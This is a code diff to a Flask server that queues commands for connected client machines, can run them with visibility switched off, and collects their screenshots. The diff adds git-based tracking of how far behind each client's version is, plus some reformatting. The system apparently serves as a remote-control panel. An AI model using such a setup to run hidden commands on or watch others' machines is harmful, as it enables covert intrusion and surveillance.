@@ -1,6 +1,8 @@
 import os
 import sqlite3
 import base64
+import subprocess
+import time
 
 from flask import Flask, render_template, request, jsonify, send_from_directory
 from flask_sock import Sock
@@ -24,6 +26,29 @@ os.makedirs(SCREENSHOT_DIR, exist_ok=True)
 
 active_clients = {}
 
+_commit_cache = {"time": 0, "commits": []}
+
+
+def get_recent_commits():
+    now = time.time()
+    if now - _commit_cache["time"] < 10 and _commit_cache["commits"]:
+        return _commit_cache["commits"]
+
+    try:
+        output = subprocess.check_output(
+            ["git", "log", "-n", "50", "--grep=updated exe", "-i", "--format=%h"],
+            cwd=os.path.dirname(os.path.abspath(__file__)),
+            text=True,
+        )
+        commits = [c.strip() for c in output.strip().splitlines() if c.strip()]
+        if commits:
+            _commit_cache["time"] = now
+            _commit_cache["commits"] = commits
+            return commits
+    except Exception:
+        pass
+
+    return _commit_cache.get("commits", [])
 
 
 def get_db():
@@ -48,7 +73,8 @@ def require_password(f):
 def init_db():
     conn = get_db()
 
-    conn.execute("""
+    conn.execute(
+        """
         CREATE TABLE IF NOT EXISTS clients (
             username TEXT PRIMARY KEY,
             cmd TEXT,
@@ -58,7 +84,8 @@ def init_db():
             version TEXT,
             updated_at TEXT
         )
-    """)
+    """
+    )
 
     try:
         conn.execute("ALTER TABLE clients ADD COLUMN version TEXT")
@@ -82,26 +109,43 @@ def index():
 def get_clients():
     conn = get_db()
 
-    rows = conn.execute("""
+    rows = conn.execute(
+        """
         SELECT username, updated_at, visible, version
         FROM clients
         ORDER BY updated_at DESC
-    """).fetchall()
+    """
+    ).fetchall()
 
     conn.close()
 
-    return jsonify(
-        [
+    recent_commits = get_recent_commits()
+    latest_sha = recent_commits[0][:7] if recent_commits else ""
+
+    result = []
+    for row in rows:
+        ver = (row["version"] or "").strip()
+        commits_behind = None
+        if ver and recent_commits:
+            ver_short = ver[:7].lower()
+            for idx, c_sha in enumerate(recent_commits):
+                c_short = c_sha[:7].lower()
+                if c_short.startswith(ver_short) or ver_short.startswith(c_short):
+                    commits_behind = idx
+                    break
+
+        result.append(
             {
                 "username": row["username"],
                 "updated_at": row["updated_at"],
                 "visible": row["visible"] if row["visible"] is not None else 1,
-                "version": row["version"] if row["version"] is not None else "",
+                "version": ver[:7] if ver else "",
+                "commits_behind": commits_behind,
+                "latest_version": latest_sha,
             }
-            for row in rows
-        ]
-    )
+        )
 
+    return jsonify(result)
 
 
 @app.get("/api/frames/<username>")
@@ -210,7 +254,7 @@ def set_command():
                 "cmd": cmd,
                 "run": True,
                 "visible": bool(visible),
-                "capture": False
+                "capture": False,
             }
             ws_client.send(json.dumps(payload))
 
@@ -239,27 +283,36 @@ def client_websocket(ws):
         # Register/update user online timestamp & version in database
         conn = get_db()
         if version:
-            conn.execute("""
+            conn.execute(
+                """
                 INSERT INTO clients (username, version, updated_at)
                 VALUES (?, ?, datetime('now'))
                 ON CONFLICT(username) DO UPDATE SET version = excluded.version, updated_at = datetime('now')
-            """, (username, version))
+            """,
+                (username, version),
+            )
         else:
-            conn.execute("""
+            conn.execute(
+                """
                 INSERT INTO clients (username, updated_at)
                 VALUES (?, datetime('now'))
                 ON CONFLICT(username) DO UPDATE SET updated_at = datetime('now')
-            """, (username,))
+            """,
+                (username,),
+            )
         conn.commit()
 
         # Send any existing pending command from DB
-        row = conn.execute("SELECT cmd, run, visible, capture FROM clients WHERE username = ?", (username,)).fetchone()
+        row = conn.execute(
+            "SELECT cmd, run, visible, capture FROM clients WHERE username = ?",
+            (username,),
+        ).fetchone()
         if row and row["run"]:
             payload = {
                 "cmd": row["cmd"] or "",
                 "run": True,
                 "visible": bool(row["visible"]),
-                "capture": bool(row["capture"])
+                "capture": bool(row["capture"]),
             }
             ws.send(json.dumps(payload))
             conn.execute("UPDATE clients SET run = 0 WHERE username = ?", (username,))
@@ -271,19 +324,25 @@ def client_websocket(ws):
             data = ws.receive()
             if data is None:
                 break
-            
+
             # Handle JSON response/heartbeat if sent by client
             try:
                 msg = json.loads(data)
                 ping_ver = msg.get("version") or version
                 if ping_ver:
                     conn = get_db()
-                    conn.execute("UPDATE clients SET version = ?, updated_at = datetime('now') WHERE username = ?", (ping_ver, username))
+                    conn.execute(
+                        "UPDATE clients SET version = ?, updated_at = datetime('now') WHERE username = ?",
+                        (ping_ver, username),
+                    )
                     conn.commit()
                     conn.close()
                 else:
                     conn = get_db()
-                    conn.execute("UPDATE clients SET updated_at = datetime('now') WHERE username = ?", (username,))
+                    conn.execute(
+                        "UPDATE clients SET updated_at = datetime('now') WHERE username = ?",
+                        (username,),
+                    )
                     conn.commit()
                     conn.close()
 
@@ -291,7 +350,10 @@ def client_websocket(ws):
                     ws.send(json.dumps({"type": "pong"}))
             except Exception:
                 conn = get_db()
-                conn.execute("UPDATE clients SET updated_at = datetime('now') WHERE username = ?", (username,))
+                conn.execute(
+                    "UPDATE clients SET updated_at = datetime('now') WHERE username = ?",
+                    (username,),
+                )
                 conn.commit()
                 conn.close()
     except Exception:
@@ -343,7 +405,6 @@ def poll_command():
         )
 
     conn.commit()
-
 
     row = conn.execute(
         """
@@ -400,7 +461,9 @@ def poll_frames():
     conn = get_db()
 
     if version:
-        conn.execute("UPDATE clients SET version = ? WHERE username = ?", (version, username))
+        conn.execute(
+            "UPDATE clients SET version = ? WHERE username = ?", (version, username)
+        )
         conn.commit()
 
     row = conn.execute(
@@ -418,9 +481,7 @@ def poll_frames():
 
     conn.close()
 
-
     return jsonify({"capture": capture_val})
-
 
 
 @app.post("/api/upload")
